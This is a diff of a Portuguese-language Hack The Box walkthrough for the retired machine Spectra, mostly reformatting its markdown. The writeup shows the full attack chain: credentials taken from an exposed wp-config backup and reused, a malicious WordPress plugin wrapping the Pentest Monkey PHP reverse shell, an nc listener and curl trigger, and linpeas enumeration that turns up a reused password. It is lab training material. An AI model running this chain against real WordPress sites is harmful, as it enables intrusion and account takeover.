@@ -1,24 +1,26 @@
 ---
-date: 2021-06-26 16:00:00
-images: 
-- https://i.imgur.com/KjpVjtL.png
+title: 'Walktrough: HTB Spectra'
 language: pt-BR
 localeid: htb-spectra
+date: 2021-06-26T16:00:00.000Z
 tags:
-- HackTheBox
-- HTB Easy
-- HTB Linux
-- Walktrough
-title: 'Walktrough: HTB Spectra'
-authors: ['default']
+  - HackTheBox
+  - HTB Easy
+  - HTB Linux
+  - Walktrough
+summary: ''
+images:
+  - 'https://i.imgur.com/KjpVjtL.png'
+authors:
+  - default
 ---
 
 Olá pessoal!
 
 A máquina desta semana será **Spectra**, outra máquina Linux classificada como fácil do [Hack The Box](https://www.hackthebox.eu), criada por [egre55](https://app.hackthebox.eu/users/1190).
 
-:information_source: **Info**: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas
-[info]
+\:information\_source: **Info**: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas
+\[info]
 
 ![HTB Spectra](https://i.imgur.com/OqO1ZZh.png)
 
@@ -84,8 +86,8 @@ wpscan --url <url> -e vp,vt,tt,cb,dbe,u,m --plugins-detection aggressive --plugi
 
 Os seguintes pontos foram identificados para o site `main` (*Software Issue Tracking*):
 
-- Versão do WordPress: 5.4.2
-- Usuários: administrator
+* Versão do WordPress: 5.4.2
+* Usuários: administrator
 
 Dando continuidade com a enumeração de forma manual, notei que para o site *Testing*, não há um redirect para o `index.php` por padrão, listando assim o conteúdo da instalação do WordPress, onde podemos identificar um arquivo interessante: **`wp-config.php.save`**.
 
@@ -99,9 +101,7 @@ wget http://spectra.htb/testing/wp-config.php.save
 
 Inspecionando seu conteúdo, podemos ver as seguintes credenciais para o usuário de banco de dados:
 
-> Username: devtest
->
-> Password: devteam01
+> Username: devtestPassword: devteam01
 
 ```php
 // ** MySQL settings - You can get this info from your web host ** //
@@ -140,11 +140,11 @@ Uma vez que o reuso de credenciais é algo bastante comum, tentei me autenticar 
 
 Uma vez que temos acesso ao WordPress com privilégios administrativos, existem diversas maneiras de obter um shell reverso a partir destas permissões, sendo a forma mais comum o upload de um plugin malicioso que retornará um shell reverso para a máquina atacante.
 
-Para esta finalidade existe um módulo do Metasploit Framework chamado [wp_admin_shell_upload](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/unix/webapp/wp_admin_shell_upload.md), que automatiza este processo de forma bem eficiente, porém, se estiver se preparando para a OSCP, que te limita a quantidade de vezes que pode utilizar o framework, para esta atividade simples isso não seria uma boa ideia :smile:.
+Para esta finalidade existe um módulo do Metasploit Framework chamado [wp\_admin\_shell\_upload](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/unix/webapp/wp_admin_shell_upload.md), que automatiza este processo de forma bem eficiente, porém, se estiver se preparando para a OSCP, que te limita a quantidade de vezes que pode utilizar o framework, para esta atividade simples isso não seria uma boa ideia \:smile:.
 
 Então, para criar este plugin, precisamos realizar os seguintes passos:
 
-- Criar um arquivo com o header do plugin. Este header tem que obedecer aos requisitos mínimos conforme documentado em [Header Requirements \| Plugin Developer Handbook \| WordPress Developer Resources](https://developer.wordpress.org/plugins/plugin-basics/header-requirements/). No nosso caso criei o arquivo `evilplugin.php` com o conteúdo listado abaixo.
+* Criar um arquivo com o header do plugin. Este header tem que obedecer aos requisitos mínimos conforme documentado em [Header Requirements | Plugin Developer Handbook | WordPress Developer Resources](https://developer.wordpress.org/plugins/plugin-basics/header-requirements/). No nosso caso criei o arquivo `evilplugin.php` com o conteúdo listado abaixo.
 
 ```php
 /**
@@ -156,7 +156,7 @@ Então, para criar este plugin, precisamos realizar os seguintes passos:
   */
 ```
 
-- Criar outro arquivo com o payload desejado. Neste caso como o objetivo é um shell reverso, fiz uma cópia do [php reverse shell do Pentest Monkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), alterei os detalhes deste e salvei como `exploit.php`. Abaixo evidencio o trecho do script que necessita alteração.
+* Criar outro arquivo com o payload desejado. Neste caso como o objetivo é um shell reverso, fiz uma cópia do [php reverse shell do Pentest Monkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), alterei os detalhes deste e salvei como `exploit.php`. Abaixo evidencio o trecho do script que necessita alteração.
 
 ```php
 // Usage
@@ -174,35 +174,35 @@ $daemon = 0;
 $debug = 0;
 ```
 
-- Compactar arquivo conforme abaixo
+* Compactar arquivo conforme abaixo
 
 ```bash
 $ zip evilplugin.zip evilplugin.php exploit.php
   adding: evilplugin.php (deflated 9%)
   adding: exploit.php (deflated 59%)
 ```
-  
-- Uma vez criado o arquivo, acessar o portal do WordPress, autenticar com a conta administrativa e acessar, ao lado esquerdo, o menu *Plugins* > *Add New* e, no topo, clicar no botão *Upload Plugin*
+
+* Uma vez criado o arquivo, acessar o portal do WordPress, autenticar com a conta administrativa e acessar, ao lado esquerdo, o menu *Plugins* > *Add New* e, no topo, clicar no botão *Upload Plugin*
 
 ![HTB Spectra - Upload evilplugin.zip](https://i.imgur.com/UlBkZNE.png)
 
-- Inicializar o listener de acordo com o payload configurado. No nosso caso vamos iniciar o  netcat conforme linha de comando abaixo
+* Inicializar o listener de acordo com o payload configurado. No nosso caso vamos iniciar o  netcat conforme linha de comando abaixo
 
 ```bash
 nc -lnvp 4443
 ```
 
-- Selecionar o arquivo zip recém-criado e clicar no botão *Install Now*
+* Selecionar o arquivo zip recém-criado e clicar no botão *Install Now*
 
 ![HTB Spectra - Installed evilplugin.zip](https://i.imgur.com/sNlvuWi.png)
 
-- Assim que o request for finalizado é importante fazer a requisição para o caminho dos arquivos em que o upload foi realizado. A linha de comando abaixo realiza o request usando `curl`, mas você pode deixar uma aba do browser preparada para realizar um GET nesta mesma URL
+* Assim que o request for finalizado é importante fazer a requisição para o caminho dos arquivos em que o upload foi realizado. A linha de comando abaixo realiza o request usando `curl`, mas você pode deixar uma aba do browser preparada para realizar um GET nesta mesma URL
 
 ```bash
 curl -L http://spectra.htb/main/wp-content/plugins/evilplugin/exploit.php
 ```
 
-Após este procedimento, deveremos receber um shell reverso na máquina conforme abaixo: :smiley:
+Após este procedimento, deveremos receber um shell reverso na máquina conforme abaixo: \:smiley:
 
 ```bash
 $ nc -lnvp 4443
@@ -218,25 +218,23 @@ uid=20155(nginx) gid=20156(nginx) groups=20156(nginx)
 nginx@spectra / $
 ```
 
-:bulb: **Dica:** Existem maneiras mais simples de alcançar este mesmo objetivo e ainda assim não utilizar o Metasploit. Uma ferramenta disponível no Github que pode auxiliar nesta tarefa é o [n00py/WPForce: Wordpress Attack Suite (github.com)](https://github.com/n00py/WPForce), que automatiza este e outros processos para exploração de websites em WordPress
-[info]
+\:bulb: **Dica:** Existem maneiras mais simples de alcançar este mesmo objetivo e ainda assim não utilizar o Metasploit. Uma ferramenta disponível no Github que pode auxiliar nesta tarefa é o [n00py/WPForce: Wordpress Attack Suite (github.com)](https://github.com/n00py/WPForce), que automatiza este e outros processos para exploração de websites em WordPress
+\[info]
 
 ## User flag
 
 Após acesso inicial na máquina, iniciada enumeração utilizando o script `linpeas.sh`, onde pude revisar diversas informações, conforme listado abaixo:
 
-- User: **nginx**, sem privilégios específicos (`uid=20155(nginx) gid=20156(nginx) groups=20156(nginx)`)
-
-- Sistema Operacional: **Chromium OS 11**.0_pre399094_p20200824-r6
-
-- Publicação do conteúdo do nginx a partir do diretório `/usr/local/share/nginx/html` vide caminho dos arquivos `wp-config.php` onde as credenciais abaixo foram listadas:
+* User: **nginx**, sem privilégios específicos (`uid=20155(nginx) gid=20156(nginx) groups=20156(nginx)`)
+* Sistema Operacional: **Chromium OS 11**.0\_pre399094\_p20200824-r6
+* Publicação do conteúdo do nginx a partir do diretório `/usr/local/share/nginx/html` vide caminho dos arquivos `wp-config.php` onde as credenciais abaixo foram listadas:
 
 | site    | Username | Password      |
 | ------- | -------- | ------------- |
 | main    | dev      | development01 |
 | testing | devtest  | devteam01     |
 
-- Users com console, sendo possíveis caminhos de elevação de privilégio, assim como seus privilégios:
+* Users com console, sendo possíveis caminhos de elevação de privilégio, assim como seus privilégios:
 
 ```plaintext
 [+] Users with console
@@ -248,9 +246,8 @@ uid=20156(katie) gid=20157(katie) groups=20157(katie),20158(developers)
 uid=1001(chronos-access) gid=1001(chronos-access) groups=1001(chronos-access)
 ```
 
-- MySQL  Ver 14.14 Distrib 5.7.20-19, for Linux (x86_64) using  6.3
-
-- Possíveis chaves de SSH para máquina
+* MySQL  Ver 14.14 Distrib 5.7.20-19, for Linux (x86\_64) using  6.3
+* Possíveis chaves de SSH para máquina
 
 ```plaintext
 /usr/share/chromeos-ssh-config/keys/authorized_keys
@@ -258,7 +255,7 @@ uid=1001(chronos-access) gid=1001(chronos-access) groups=1001(chronos-access)
 /usr/share/chromeos-ssh-config/keys/id_rsa.pub
 ```
 
-- Arquivos passwd incomuns, sendo um deles para **autologin** e com a senha **SummerHereWeCome!!** presente
+* Arquivos passwd incomuns, sendo um deles para **autologin** e com a senha **SummerHereWeCome!!** presente
 
 ```plaintext
 [+] Searching uncommon passwd files (splunk)
@@ -271,9 +268,9 @@ passwd file: /usr/share/baselayout/passwd
 SummerHereWeCome!!
 ```
 
-- Arquivo `user.txt` no home path da usuária **katie**, enumerado manualmente no que poderia ser visto no diretório de cada um dos usuários logados
+* Arquivo `user.txt` no home path da usuária **katie**, enumerado manualmente no que poderia ser visto no diretório de cada um dos usuários logados
 
-Uma vez que encontramos algumas senhas, um usuário inclusive que já tínhamos conhecimento vide enumeração via HTTP, decidi testá-las para os usuários `katie` e `chronos`, tendo sucesso com a seguinte combinação: **katie:SummerHereWeCome!!**
+Uma vez que encontramos algumas senhas, um usuário inclusive que já tínhamos conhecimento vide enumeração via HTTP, decidi testá-las para os usuários `katie` e `chronos`, tendo sucesso com a seguinte combinação: **katie\:SummerHereWeCome!!**
 
 Com acesso neste perfil realizado leitura da flag presente em seu home directory
 
@@ -403,4 +400,4 @@ root
 
 Espero que tenham gostado!
 
-Vejo vocês no próximo post :smiley:
+Vejo vocês no próximo post \:smiley:
